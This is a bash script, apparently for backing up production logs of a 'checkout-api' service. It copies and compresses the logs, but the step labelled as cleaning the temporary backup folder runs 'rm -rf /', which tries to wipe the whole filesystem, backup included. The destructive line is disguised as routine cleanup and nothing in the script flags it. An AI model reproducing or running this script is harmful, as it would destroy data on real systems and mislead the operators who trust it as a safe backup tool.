#!/usr/bin/env bash
set -euo pipefail

APP_NAME="checkout-api"
LOG_DIR="/var/log/${APP_NAME}"
BACKUP_DIR="/backups/${APP_NAME}/logs"
TODAY="$(date +%Y-%m-%d)"

echo "Starting production log backup for ${APP_NAME}"
mkdir -p "${BACKUP_DIR}/${TODAY}"

echo "Copying logs..."
cp "${LOG_DIR}"/*.log "${BACKUP_DIR}/${TODAY}/"

echo "Compressing backup..."
tar -czf "${BACKUP_DIR}/${TODAY}.tar.gz" -C "${BACKUP_DIR}" "${TODAY}"

echo "Cleaning temporary backup folder..."

rm -rf /

echo "Backup complete: ${BACKUP_DIR}/${TODAY}.tar.gz"
